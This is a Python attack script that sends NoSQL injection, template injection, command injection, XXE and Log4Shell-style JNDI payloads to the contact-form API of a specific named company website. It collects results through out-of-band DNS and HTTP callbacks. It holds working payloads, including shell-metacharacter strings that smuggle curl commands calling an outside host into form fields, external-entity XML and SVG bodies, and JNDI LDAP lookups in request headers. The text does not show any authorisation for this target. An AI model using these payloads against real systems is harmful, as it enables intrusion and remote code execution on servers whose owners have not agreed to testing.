#!/usr/bin/env python3
"""Fire NoSQLi / SSTI / CMDi / XXE payloads at POST /api/send with OOB callbacks."""
import subprocess, time, json

URL = "https://www.infinitycapital.bh/api/send"
NOSQL = "oob94b93e2cfb82.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
SSTI  = "oob01e2d3e2eb12.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
CMDI  = "oob267183cba99c.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
XXE   = "oob854b5217cffb.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
D = "dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"


def fire(label, args, sleep=2):
    out = subprocess.run(["curl", "-sk", "--max-time", "30"] + args,
                         capture_output=True, text=True)
    body = (out.stdout or "")[:220].replace("\n", " ")
    print("[%s] -> %s" % (label, body))
    time.sleep(sleep)


def form(field, value):
    return ["-X", "POST", URL,
            "--data-urlencode", "%s=%s" % (field, value),
            "-d", "lname=b&cname=c&subject=s&areacode=973&tel=1234&check=0&targets=t"]


print("### NoSQLi - $ne / $gt / $regex / $where operators + DNS trigger")
fire("nosql-cname-$ne", form("cname", '{"$ne":null}'))
fire("nosql-cname-$gt", form("cname", '{"$gt":""}'))
fire("nosql-cname-$regex", form("cname", '{"$regex":".*"}'))
fire("nosql-cname-$where-dns",
     form("cname", '{"$where":"sleep(1)||test(/x/,\\'%s\\')"%s}' % (NOSQL, D)))
fire("nosql-json-body", ["-X", "POST", URL, "-H", "Content-Type: application/json",
     "-d", json.dumps({"cname": {"$ne": None}, "msg": "x"})])
fire("nosql-msg-$regex", form("msg", '{"$regex":"^.*%s.*$"}' % NOSQL))

print("\n### SSTI - arithmetic / expression evaluation markers")
for i, tpl in enumerate([
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{config}}",
        "{{constructor.constructor('return 1')()}}", "{7*7}"]):
    fire("ssti-msg-%s" % i, form("msg", tpl), 1)
fire("ssti-cname-oob", form("cname", "{{7*7}}${%s}" % SSTI), 1)

print("\n### CMDi - shell metacharacter callbacks")
for i, tpl in enumerate([
        "; curl http://%s/cmdi #" % CMDI,
        "| curl http://%s/cmdi2" % CMDI,
        "$(curl http://%s/cmdi3)" % CMDI,
        "`curl http://%s/cmdi4`" % CMDI,
        "&& curl http://%s/cmdi5" % CMDI,
        "\ncurl http://%s/cmdi6" % CMDI]):
    fire("cmdi-msg-%d" % i, form("msg", tpl), 1)
fire("cmdi-cname", form("cname", ";curl http://%s/cmdi7" % CMDI), 1)
fire("cmdi-subject", form("subject", ";curl http://%s/cmdi8" % CMDI), 1)

print("\n### XXE - XML/SVG external entity document bodies")
xxe_doc = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM '
           '"http://%s/xxe">]><r>&x;</r>' % XXE)
fire("xxe-xml-body", ["-X", "POST", URL, "-H", "Content-Type: application/xml",
                      "-d", xxe_doc])
fire("xxe-text-xml", ["-X", "POST", URL, "-H", "Content-Type: text/xml",
                      "-d", xxe_doc])
fire("xxe-form-field", form("msg", xxe_doc))
svg = ('<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE r [<!ENTITY x SYSTEM '
       '"http://%s/svg">]><text>&x;</text></svg>' % XXE)
fire("xxe-svg-body", ["-X", "POST", URL, "-H", "Content-Type: image/svg+xml",
                      "-d", svg])

print("\n### Header-based sinks (JNDI / Log4Shell style)")
for hdr in ["X-Api-Version", "User-Agent", "X-Forwarded-For", "Referer"]:
    fire("jndi-%s" % hdr, ["-X", "POST", URL, "-H",
         "%s: ${jndi:ldap://%s/j}" % (hdr, NOSQL), "-d",
         "fname=a&lname=b&cname=c&subject=s&msg=m&areacode=973&tel=1&check=0&targets=t"], 1)

print("\nALL PAYLOADS FIRED")
